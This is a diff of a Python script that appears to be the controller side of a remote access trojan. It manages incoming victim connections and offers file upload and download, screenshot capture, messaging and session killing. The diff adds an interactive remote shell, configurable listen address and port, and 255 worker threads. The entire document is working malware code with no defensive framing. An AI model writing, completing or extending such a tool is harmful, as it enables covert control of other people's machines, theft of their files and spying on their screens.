@@ -2,17 +2,18 @@ import os, socket, time, threading, sys
 from queue import Queue
 
 queue = Queue()
-threads = 2
+threads = 255
 jobs = [1, 2]
 
+connection_error = False
 addresses = []
 connections = []
 
 selected_connection = None
 selected_connection_id = -1
 
-host = "127.0.0.1"
-port = 4444
+host = ""
+port = 0
 buffer_bytes = 1024
 
 
@@ -41,11 +42,14 @@ def create_socket():
         print("[-] Error creating the handler:", str(e))
 
 
-def socket_bind():
-    global s
+def socket_bind(lhost, lport):
+    global s, host, port
+    host = lhost
+    port = lport
+
     try:
-        print("[*] Listening on port:", str(port))
-        s.bind((host, port))
+        print("[*] Listening on port:", str(lport))
+        s.bind((lhost, lport))
         s.listen(20)
     except socket.error() as e:
         print("[-] Error binding the handler:", str(e))
@@ -67,9 +71,9 @@ def socket_accept():
             print("[-] Error accepting connections")
 
 
-def create_threads():
+def create_threads(lhost, lport):
     for i in range(threads):
-        thread = threading.Thread(target=work)
+        thread = threading.Thread(target=work, args=(lhost, lport))
         thread.daemon = True
         thread.start()
 
@@ -115,7 +119,7 @@ def select_connection(connection_id):
 
 
 def upload_file():
-    global selected_connection
+    global selected_connection, connection_error
 
     while True:
         file_directory = input('Type the file directory >> ')
@@ -140,16 +144,18 @@ def upload_file():
         time.sleep(1)
         file.close()
         send_data('done'.encode())
+        print("\n[+] File was uploaded")
     except socket.error:
-        print("Não foi possível enviar os dados, a conexão foi perdida")
+        print("[-] Could not send data, connection lost!")
         time.sleep(1)
         close_connection_by_id()
         time.sleep(2)
-        menu_command_options()
+        menu_help()
+        connection_error = True
 
 
 def download_file():
-    global selected_connection
+    global selected_connection, connection_error
 
     file_directory = input('Type the file directory >> ')
     file_name = file_directory.split('/')[-1]
@@ -178,14 +184,17 @@ def download_file():
 
         file.close()
     except socket.error:
-        print("Não foi possível enviar os dados, a conexão foi perdida")
+        print("[-] Could not send data, connection lost!")
         time.sleep(1)
         close_connection_by_id()
         time.sleep(2)
-        menu_command_options()
+        menu_help()
+        connection_error = True
 
 
 def send_message():
+    global connection_error
+
     message = input('Write the message >> ')
     try:
         send_data('message'.encode())
@@ -194,16 +203,17 @@ def send_message():
         time.sleep(0.2)
         send_data('done'.encode())
     except socket.error:
-        print("Não foi possível enviar os dados, a conexão foi perdida")
+        print("[-] Could not send data, connection lost!")
         time.sleep(1)
         close_connection_by_id()
         time.sleep(2)
-        menu_command_options()
+        menu_help()
+        connection_error = True
 
 
 
 def receive_screenshot():
-    global selected_connection
+    global selected_connection, connection_error
 
     try:
         selected_connection.send(str.encode("screenshot"))
@@ -223,11 +233,13 @@ def receive_screenshot():
         print("\n[+] Received screenshot from now...")
         picture.close()
     except socket.error:
-        print("Não foi possível enviar os dados, a conexão foi perdida")
+        print("[-] Could not send data, connection lost!")
         time.sleep(1)
         close_connection_by_id()
         time.sleep(2)
         menu_command_options()
+        menu_help()
+        connection_error = True
 
 
 def sleep_session():
@@ -237,8 +249,46 @@ def sleep_session():
     selected_connection = None
     selected_connection_id = -1
 
+def shell():
+    global selected_connection, buffer_bytes, connection_error
+    print("[*] Gaining access to shell...\n\n")
+    print("Type exit to exit shell.")
+    SEPARATOR = '<sep>'
+
+    try:
+        selected_connection.send('shell'.encode())
+        working_dir = receive_data(1024 * 128).decode()
+        print(f"[*] Working DIR - {working_dir}\n")
+
+        while True:
+            command = input("shell >> ")
+            try:
+                if not command.strip():
+                    continue
+                
+                selected_connection.send(command.encode())
+                if command.lower() == "exit":
+                    print("[-] Leaving shell...")
+                    menu_command_options()
+                    break
+                output = selected_connection.recv(buffer_bytes * 128).decode()
+                results, cwd = output.split(SEPARATOR)
+                if (command.lower()[:2] == 'cd'):
+                    print(f"[*] Working DIR - {cwd}\n")
+                print(results)
+            except:
+                pass
+    except:
+        print("[-] Could not send data, connection lost!")
+        time.sleep(1)
+        close_connection_by_id()
+        time.sleep(2)
+        menu_help()
+        connection_error = True
 
 def interact():
+    global connection_error
+
     menu_command_options()
     while True:
         choice = input("\n>> ")
@@ -246,7 +296,9 @@ def interact():
             menu_command_options()
         elif choice == '-b':
             sleep_session()
-            return
+            break
+        elif choice == '-c':
+            shell()
         elif choice == '-s':
             receive_screenshot()
         elif choice == '-u':
@@ -257,7 +309,12 @@ def interact():
             send_message()
         elif choice == '-k':
             close_connection_by_id()
-            return
+            menu_help()
+            break
+        else:
+            print("\n[-] Invalid choice!")
+        if connection_error:
+            break
 
 
 def close():
@@ -283,8 +340,11 @@ def close_connection_by_id():
     conn = connections[selected_connection_id]
     addresses.pop(selected_connection_id)
     connections.pop(selected_connection_id)
-    conn.send(str.encode("exit"))
-    conn.close()
+    try:
+        conn.send(str.encode("exit"))
+        conn.close()
+    except:
+        pass
 
     print(f"\n[-] Killing session {selected_connection_id}...")
 
@@ -327,12 +387,12 @@ def main_menu():
             print("\n[-] Invalid choice!")
 
 
-def work():
+def work(lhost, lport):
     while True:
         value = queue.get()
         if value == 1:
             create_socket()
-            socket_bind()
+            socket_bind(lhost, lport)
             socket_accept()
         elif value == 2:
             while True:
@@ -351,6 +411,6 @@ def create_jobs():
     queue.join()
 
 
-def start_server():
-    create_threads()
+def start_server(lhost, lport):
+    create_threads(lhost, lport)
     create_jobs()
